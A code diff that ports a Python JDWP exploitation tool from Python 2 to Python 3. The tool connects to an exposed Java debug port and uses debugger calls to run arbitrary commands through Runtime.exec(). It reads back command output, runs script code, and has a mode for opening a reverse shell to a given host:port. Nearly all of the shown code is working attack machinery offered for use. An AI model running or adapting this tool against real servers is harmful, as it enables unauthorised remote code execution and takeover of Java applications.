@@ -1,9 +1,22 @@
+# -*- coding: utf-8 -*-
+from __future__ import print_function
+
 import socket
 import time
 import sys
 import struct
 import argparse
 import binascii
+
+def to_bytes(s):
+    if sys.version_info[0] >= 3:
+        return s.encode() if isinstance(s, str) else s
+    return s
+
+def to_string(b):
+    if sys.version_info[0] >= 3:
+        return b.decode() if isinstance(b, bytes) else b
+    return b
 
 HANDSHAKE = "JDWP-Handshake"
 
@@ -64,12 +77,15 @@ class JDWPClient:
         self.id = 0x01
         return
 
-    def create_packet(self, cmdsig, data=""):
+    def create_packet(self, cmdsig, data=b""):
         flags = 0x00
         cmdset, cmd = cmdsig
         pktlen = len(data) + 11
-        pkt = struct.pack(">IIccc", pktlen, self.id, chr(flags), chr(cmdset), chr(cmd))
-        pkt += data
+        pkt = struct.pack(">IIccc", pktlen, self.id, 
+                         to_bytes(chr(flags)), 
+                         to_bytes(chr(cmdset)), 
+                         to_bytes(chr(cmd)))
+        pkt += data if isinstance(data, bytes) else to_bytes(data)
         self.id += 2
         return pkt
 
@@ -77,11 +93,11 @@ class JDWPClient:
         header = self.socket.recv(11)
         pktlen, id, flags, errcode = struct.unpack(">IIcH", header)
 
-        if flags == chr(REPLY_PACKET_TYPE):
+        if ord(flags) == REPLY_PACKET_TYPE:
             if errcode:
                 raise Exception("Received errcode %d" % errcode)
 
-        buf = ""
+        buf = b""
         while len(buf) + 11 < pktlen:
             data = self.socket.recv(1024)
             if len(data):
@@ -111,13 +127,13 @@ class JDWPClient:
                     index += 4
                 elif fmt == 'S':
                     l = struct.unpack(">I", buf[index:index + 4])[0]
-                    data[name] = buf[index + 4:index + 4 + l]
+                    data[name] = to_string(buf[index + 4:index + 4 + l])
                     index += 4 + l
                 elif fmt == 'C':
-                    data[name] = ord(struct.unpack(">c", buf[index])[0])
+                    data[name] = ord(struct.unpack(">c", buf[index:index + 1])[0])
                     index += 1
                 elif fmt == 'Z':
-                    t = ord(struct.unpack(">c", buf[index])[0])
+                    t = ord(struct.unpack(">c", buf[index:index + 1])[0])
                     if t == 115:
                         s = self.solve_string(buf[index + 1:index + 9])
                         data[name] = s
@@ -126,13 +142,10 @@ class JDWPClient:
                         data[name] = struct.unpack(">I", buf[index + 1:index + 5])[0]
                         buf = struct.unpack(">I", buf[index + 5:index + 9])
                         index = 0
-
                 else:
                     print("Error")
                     sys.exit(1)
-
             entries.append(data)
-
         return entries
 
     def format(self, fmt, value):
@@ -166,13 +179,11 @@ class JDWPClient:
         except socket.error as msg:
             raise Exception("Failed to connect: %s" % msg)
 
-        s.send(HANDSHAKE)
-
-        if s.recv(len(HANDSHAKE)) != HANDSHAKE:
+        s.send(to_bytes(HANDSHAKE))
+        if s.recv(len(HANDSHAKE)) != to_bytes(HANDSHAKE):
             raise Exception("Failed to handshake")
         else:
             self.socket = s
-
         return
 
     def leave(self):
@@ -185,7 +196,7 @@ class JDWPClient:
         formats = [('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                    ('S', "vmVersion"), ('S', "vmName"), ]
         for entry in self.parse_entries(buf, formats, False):
-            for name, value in entry.iteritems():
+            for name, value in entry.items():
                 setattr(self, name, value)
         return
 
@@ -199,7 +210,7 @@ class JDWPClient:
         formats = [("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                    ("I", "referenceTypeIDSize"), ("I", "frameIDSize")]
         for entry in self.parse_entries(buf, formats, False):
-            for name, value in entry.iteritems():
+            for name, value in entry.items():
                 setattr(self, name, value)
         return
 
@@ -253,7 +264,7 @@ class JDWPClient:
         return None
 
     def get_methods(self, refTypeId):
-        if not self.methods.has_key(refTypeId):
+        if refTypeId not in self.methods:
             refId = self.format(self.referenceTypeIDSize, refTypeId)
             self.socket.sendall(self.create_packet(METHODS_SIG, data=refId))
             buf = self.read_reply()
@@ -272,7 +283,7 @@ class JDWPClient:
         return None
 
     def getfields(self, refTypeId):
-        if not self.fields.has_key(refTypeId):
+        if refTypeId not in self.fields:
             refId = self.format(self.referenceTypeIDSize, refTypeId)
             self.socket.sendall(self.create_packet(FIELDS_SIG, data=refId))
             buf = self.read_reply()
@@ -300,11 +311,11 @@ class JDWPClient:
         return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)
 
     def buildstring(self, data):
-        return struct.pack(">I", len(data)) + data
+        return struct.pack(">I", len(data)) + to_bytes(data)
 
     def readstring(self, data):
         size = struct.unpack(">I", data[:4])[0]
-        return data[4:4 + size]
+        return to_string(data[4:4 + size])
 
     def suspendvm(self):
         self.socket.sendall(self.create_packet(SUSPENDVM_SIG))
@@ -384,13 +395,13 @@ class JDWPClient:
         return self.query_thread(threadId, THREADRESUME_SIG)
 
     def send_event(self, eventCode, *args):
-        data = ""
-        data += chr(eventCode)
-        data += chr(SUSPEND_ALL)
+        data = b""
+        data += to_bytes(chr(eventCode))
+        data += to_bytes(chr(SUSPEND_ALL))
         data += struct.pack(">I", len(args))
 
         for kind, option in args:
-            data += chr(kind)
+            data += to_bytes(chr(kind))
             data += option
 
         self.socket.sendall(self.create_packet(EVENTSET_SIG, data=data))
@@ -398,7 +409,7 @@ class JDWPClient:
         return struct.unpack(">I", buf)[0]
 
     def clear_event(self, eventCode, rId):
-        data = chr(eventCode)
+        data = to_bytes(chr(eventCode))
         data += struct.pack(">I", rId)
         self.socket.sendall(self.create_packet(EVENTCLEAR_SIG, data=data))
         self.read_reply()
@@ -426,10 +437,11 @@ class JDWPClient:
 # ================================================================================================================================================
 def get_class_id(jdwp, signature):
     c = jdwp.get_class_by_signature(signature)
-    if 'refTypeId' in c:
-        return c["refTypeId"]
-    else:
-        raise Exception("[-] get class failed : {}".format(signature))
+    if c is None:
+        raise Exception("[-] get class failed : {} (class not found)".format(signature))
+    if 'refTypeId' not in c:
+        raise Exception("[-] get class failed : {} (no refTypeId)".format(signature))
+    return c["refTypeId"]
 
 
 def get_method_id(jdwp, class_id, method_name, signature):
@@ -481,51 +493,51 @@ def get_string_id(jdwp, string):
 
 def invoke_static_object(jdwp, thread_id, class_id, method_id, param_id):
     if param_id:
-        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id), ]
+        data = [to_bytes(chr(TAG_OBJECT)) + jdwp.format(jdwp.objectIDSize, param_id)]
         buf = jdwp.invokestatic(class_id, thread_id, method_id, *data)
     else:
         buf = jdwp.invokestatic(class_id, thread_id, method_id)
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[0:1] != to_bytes(chr(TAG_OBJECT)):
         raise Exception("[-] invoke static object failed")
     return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
 
 
 def invoke_static_class(jdwp, thread_id, class_id, method_id, param_id):
     if param_id:
-        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id), ]
+        data = [to_bytes(chr(TAG_OBJECT)) + jdwp.format(jdwp.objectIDSize, param_id)]
         buf = jdwp.invokestatic(class_id, thread_id, method_id, *data)
     else:
         buf = jdwp.invokestatic(class_id, thread_id, method_id)
-    if buf[0] != 'c':
+    if buf[0:1] != b'c':
         raise Exception("[-] invoke static class failed")
     return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
 
 
 def invoke_object(jdwp, thread_id, class_id, object_id, method_id, param_id):
     if param_id:
-        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
+        data = [to_bytes(chr(TAG_OBJECT)) + jdwp.format(jdwp.objectIDSize, param_id)]
         buf = jdwp.invoke(object_id, thread_id, class_id, method_id, *data)
     else:
         buf = jdwp.invoke(object_id, thread_id, class_id, method_id)
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[0:1] != to_bytes(chr(TAG_OBJECT)):
         raise Exception("[-] invoke object failed")
     return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
 
 
 def invoke_string(jdwp, thread_id, class_id, object_id, method_id, param_id):
     if param_id:
-        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
+        data = [to_bytes(chr(TAG_OBJECT)) + jdwp.format(jdwp.objectIDSize, param_id)]
         buf = jdwp.invoke(object_id, thread_id, class_id, method_id, *data)
     else:
         buf = jdwp.invoke(object_id, thread_id, class_id, method_id)
-    if buf[0] != chr(TAG_STRING):
+    if buf[0:1] != to_bytes(chr(TAG_STRING)):
         raise Exception("[-] invoke string failed")
     return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
 
 
 def invoke(jdwp, thread_id, class_id, object_id, method_id, param_id):
     if param_id:
-        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
+        data = [to_bytes(chr(TAG_OBJECT)) + jdwp.format(jdwp.objectIDSize, param_id)]
         buf = jdwp.invoke(object_id, thread_id, class_id, method_id, *data)
     else:
         buf = jdwp.invoke(object_id, thread_id, class_id, method_id)
@@ -534,11 +546,11 @@ def invoke(jdwp, thread_id, class_id, object_id, method_id, param_id):
 
 def new_instance(jdwp, thread_id, class_id, method_id, param_id):
     if param_id:
-        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
+        data = [to_bytes(chr(TAG_OBJECT)) + jdwp.format(jdwp.objectIDSize, param_id)]
         buf = jdwp.newInstance(class_id, thread_id, method_id, *data)
     else:
         buf = jdwp.newInstance(class_id, thread_id, method_id)
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[0:1] != to_bytes(chr(TAG_OBJECT)):
         raise Exception("[-] new instance failed")
     return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
 
@@ -567,13 +579,12 @@ def runtime_exec(jdwp, cmd):
         retId = invoke_object(jdwp, thread_id, runtime_class_id, runtime_object_id, exec_method_id, string_id)
         print ("[+] Runtime.exec() successful, retId: {:#x} ".format(retId))
     except Exception as e:
-        print(e.message)
+        print(str(e))
         jdwp.resumevm()
 
 def runtime_exec_2(jdwp, cmd):
     try:
         thread_id = get_thread_id(jdwp)
-
 
         runtime_class_id = get_class_id(jdwp, "Ljava/lang/Runtime;")
         print ("[+] Found Runtime class: {:#x}".format(runtime_class_id))
@@ -588,25 +599,35 @@ def runtime_exec_2(jdwp, cmd):
         retId = invoke_object(jdwp, thread_id, runtime_class_id, runtime_object_id, exec_method_id, string_id)
         print ("[+] Runtime.exec() successful, retId: {:#x} ".format(retId))
 
-
         process_class_id = get_class_id(jdwp, "Ljava/lang/Process;")
         process_getInputStream_method_id = get_method_id(jdwp, process_class_id, "getInputStream", "()Ljava/io/InputStream;")
         inputStream_object_id = invoke_object(jdwp, thread_id, process_class_id, retId, process_getInputStream_method_id, None)
 
-        scanner_class_id = get_class_id(jdwp, "Ljava/util/Scanner;")
-        scanner_init_method_id = get_method_id(jdwp, scanner_class_id, "<init>", "(Ljava/io/InputStream;)V")
-        scanner_object_id = new_instance(jdwp, thread_id, scanner_class_id, scanner_init_method_id, inputStream_object_id )
+        reader_class_id = get_class_id(jdwp, "Ljava/io/BufferedReader;")
+        input_stream_reader_class_id = get_class_id(jdwp, "Ljava/io/InputStreamReader;")
+        
+        isr_init_method_id = get_method_id(jdwp, input_stream_reader_class_id, "<init>", "(Ljava/io/InputStream;)V")
+        isr_object_id = new_instance(jdwp, thread_id, input_stream_reader_class_id, isr_init_method_id, inputStream_object_id)
+        
+        reader_init_method_id = get_method_id(jdwp, reader_class_id, "<init>", "(Ljava/io/Reader;)V")
+        reader_object_id = new_instance(jdwp, thread_id, reader_class_id, reader_init_method_id, isr_object_id)
 
-        scanner_useDelimiter_method_id = get_method_id(jdwp, scanner_class_id, "useDelimiter", "(Ljava/lang/String;)Ljava/util/Scanner;")
-        scanner_object_id_2 = invoke_object(jdwp, thread_id, scanner_class_id, scanner_object_id, scanner_useDelimiter_method_id, get_string_id(jdwp,"\\z"))
+        readLine_method_id = get_method_id(jdwp, reader_class_id, "readLine", "()Ljava/lang/String;")
+        
+        result = []
+        while True:
+            try:
+                line_string = invoke_string(jdwp, thread_id, reader_class_id, reader_object_id, readLine_method_id, None)
+                if line_string == 0:  # EOF
+                    break
+                line = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, line_string))
+                result.append(line)
+            except:
+                break
 
-        scanner_next_method_id = get_method_id(jdwp, scanner_class_id, "next", "()Ljava/lang/String;")
-        result_string = invoke_string(jdwp, thread_id, scanner_class_id, scanner_object_id_2, scanner_next_method_id, None)
-        res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, result_string))
-
-        return res
+        return '\n'.join(result)
     except Exception as e:
-        print(e.message)
+        print(str(e))
         jdwp.resumevm()
 
 
@@ -629,7 +650,7 @@ try {{
 if(!result){{
     result = 'null';
 }}
-result.toString();'''.format(binascii.hexlify(code))
+result.toString();'''.format(binascii.hexlify(code.encode()).decode())
     try:
         thread_id = get_thread_id(jdwp)
 
@@ -661,7 +682,7 @@ result.toString();'''.format(binascii.hexlify(code))
 
         return res
     except Exception as e:
-        print(e.message)
+        print(str(e))
         jdwp.resumevm()
 
 
@@ -682,10 +703,10 @@ if __name__ == "__main__":
     client = JDWPClient(args.t, args.p)
     try:
         client.start()
-    except:
-        print("Handshake failed!")
+    except Exception as e:
+        print("[!] Handshake failed: {}".format(str(e)))
         client.leave()
-        exit(0)
+        exit(1)
     print("[+] Dump vm description \n{}\n".format(client.description))
 
     if args.m == "command":
@@ -693,7 +714,7 @@ if __name__ == "__main__":
             print("[-] Command cannot be empty")
             exit(0)
         runtime_exec(client, args.c)
-    if args.m == "rshell":
+    elif args.m == "rshell":
         if not args.a or args.a.strip() == "" or ':' not in args.a:
             print("[-] Shell address need be like host:port")
             exit(0)
